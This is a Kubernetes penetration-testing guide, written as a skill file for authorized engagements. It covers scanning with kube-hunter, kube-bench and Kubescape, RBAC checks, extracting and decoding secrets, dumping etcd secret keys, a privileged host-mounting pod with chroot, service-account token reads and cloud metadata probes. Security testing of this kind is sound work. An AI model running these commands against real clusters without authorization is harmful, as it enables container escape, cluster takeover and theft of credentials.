---
name: performing-kubernetes-penetration-testing
description: Kubernetes penetration testing systematically evaluates cluster security by simulating attacker techniques against the API server, kubelet, etcd, pods, RBAC, network policies, and secrets. Using tools
domain: cybersecurity
subdomain: container-security
tags: [containers, kubernetes, security, penetration-testing, offensive-security]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# Performing Kubernetes Penetration Testing

## Overview

Kubernetes penetration testing systematically evaluates cluster security by simulating attacker techniques against the API server, kubelet, etcd, pods, RBAC, network policies, and secrets. Using tools like kube-hunter, Kubescape, peirates, and manual kubectl exploitation, testers identify misconfigurations that could lead to cluster compromise.

## Prerequisites

- Authorized penetration testing engagement
- Kubernetes cluster access (various levels for different test scenarios)
- kube-hunter, kubescape, kube-bench installed
- kubectl configured
- Network access to cluster components

## Core Concepts

### Kubernetes Attack Surface

| Component | Port | Attack Vectors |
|-----------|------|---------------|
| API Server | 6443 | Auth bypass, RBAC abuse, anonymous access |
| Kubelet | 10250/10255 | Unauthenticated access, command execution |
| etcd | 2379/2380 | Unauthenticated read, secret extraction |
| Dashboard | 8443 | Default credentials, token theft |
| NodePort Services | 30000-32767 | Service exposure, application exploits |
| CoreDNS | 53 | DNS spoofing, zone transfer |

### MITRE ATT&CK for Kubernetes

| Phase | Techniques |
|-------|-----------|
| Initial Access | Exposed Dashboard, Kubeconfig theft, Application exploit |
| Execution | exec into container, CronJob, deploy privileged pod |
| Persistence | Backdoor container, mutating webhook, static pod |
| Privilege Escalation | Privileged container, node access, RBAC abuse |
| Defense Evasion | Pod name mimicry, namespace hiding, log deletion |
| Credential Access | Secret extraction, service account token theft |
| Lateral Movement | Container escape, cluster internal services |

## Implementation Steps

### Step 1: External Reconnaissance

```bash
# Discover Kubernetes services
nmap -sV -p 443,6443,8443,2379,10250,10255,30000-32767 target-cluster.com

# Check for exposed API server
curl -k https://target-cluster.com:6443/api
curl -k https://target-cluster.com:6443/version

# Check anonymous authentication
curl -k https://target-cluster.com:6443/api/v1/namespaces

# Check for exposed kubelet
curl -k https://node-ip:10250/pods
curl http://node-ip:10255/pods  # Read-only kubelet
```

### Step 2: Automated Scanning with kube-hunter

```bash
# Install kube-hunter
pip install kube-hunter

# Remote scan
kube-hunter --remote target-cluster.com

# Internal network scan (from within cluster)
kube-hunter --internal

# Pod scan (from within a pod)
kube-hunter --pod

# Generate report
kube-hunter --remote target-cluster.com --report json --log output.json
```

### Step 3: CIS Benchmark Assessment with kube-bench

```bash
# Run kube-bench on master node
kube-bench run --targets master

# Run on worker node
kube-bench run --targets node

# Check specific sections
kube-bench run --targets master --check 1.2.1,1.2.2,1.2.3

# JSON output
kube-bench run --json > kube-bench-results.json

# Run as Kubernetes job
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml
kubectl logs -l app=kube-bench
```

### Step 4: Framework Compliance with Kubescape

```bash
# Install kubescape
curl -s https://raw.githubusercontent.com/kubescape/kubescape/master/install.sh | /bin/bash

# Scan against NSA/CISA hardening guide
kubescape scan framework nsa

# Scan against MITRE ATT&CK
kubescape scan framework mitre

# Scan against CIS Kubernetes Benchmark
kubescape scan framework cis-v1.23-t1.0.1

# Scan specific namespace
kubescape scan framework nsa --namespace production

# JSON output
kubescape scan framework nsa --format json --output kubescape-report.json
```

### Step 5: RBAC Exploitation Testing

```bash
# Check current permissions
kubectl auth can-i --list

# Check specific high-value permissions
kubectl auth can-i create pods
kubectl auth can-i create pods --subresource=exec
kubectl auth can-i get secrets
kubectl auth can-i create clusterrolebindings
kubectl auth can-i '*' '*'  # cluster-admin check

# Enumerate service account tokens
kubectl get serviceaccounts -A
kubectl get secrets -A -o json | jq '.items[] | select(.type=="kubernetes.io/service-account-token") | {name: .metadata.name, namespace: .metadata.namespace}'

# Check for overly permissive roles
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name=="system:anonymous" or .subjects[]?.name=="system:unauthenticated")'

# Test service account impersonation
kubectl --as=system:serviceaccount:default:default get pods
```

### Step 6: Secret Extraction Testing

```bash
# List all secrets
kubectl get secrets -A

# Extract specific secret
kubectl get secret db-credentials -o jsonpath='{.data.password}' | base64 -d

# Check for secrets in environment variables
kubectl get pods -A -o json | jq '.items[].spec.containers[].env[]? | select(.valueFrom.secretKeyRef)'

# Check for secrets in mounted volumes
kubectl get pods -A -o json | jq '.items[].spec.volumes[]? | select(.secret)'

# Search etcd directly (if accessible)
ETCDCTL_API=3 etcdctl --endpoints=https://etcd-ip:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only
```

### Step 7: Pod Exploitation

```bash
# Deploy test pod with elevated privileges
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pentest-pod
  namespace: default
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: pentest
    image: ubuntu:22.04
    command: ["sleep", "infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# Exec into pod
kubectl exec -it pentest-pod -- bash

# From inside privileged pod - access host filesystem
chroot /host

# From inside any pod - check internal services
curl -k https://kubernetes.default.svc/api/v1/namespaces
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Step 8: Network Policy Testing

```bash
# Check for network policies
kubectl get networkpolicies -A

# Test pod-to-pod communication (should be blocked by policies)
kubectl run test-netpol --image=busybox --restart=Never -- wget -qO- --timeout=2 http://target-service.namespace.svc

# Test egress to external services
kubectl run test-egress --image=busybox --restart=Never -- wget -qO- --timeout=2 http://example.com

# Test access to metadata service (cloud environments)
kubectl run test-metadata --image=busybox --restart=Never -- wget -qO- --timeout=2 http://169.254.169.254/latest/meta-data/
```

## Validation Commands

```bash
# Verify kube-hunter findings
kube-hunter --remote $CLUSTER_IP --report json

# Cross-validate with Kubescape
kubescape scan framework nsa --format json

# Check remediation effectiveness
kube-bench run --targets master,node --json

# Clean up pentest resources
kubectl delete pod pentest-pod
kubectl delete pod test-netpol test-egress test-metadata
```

## References

- [kube-hunter - Kubernetes Penetration Testing](https://github.com/aquasecurity/kube-hunter)
- [Kubescape - Kubernetes Security Platform](https://github.com/kubescape/kubescape)
- [kube-bench - CIS Benchmark](https://github.com/aquasecurity/kube-bench)
- [MITRE ATT&CK Containers Matrix](https://attack.mitre.org/matrices/enterprise/containers/)
- [Kubernetes Threat Matrix - Microsoft](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/)
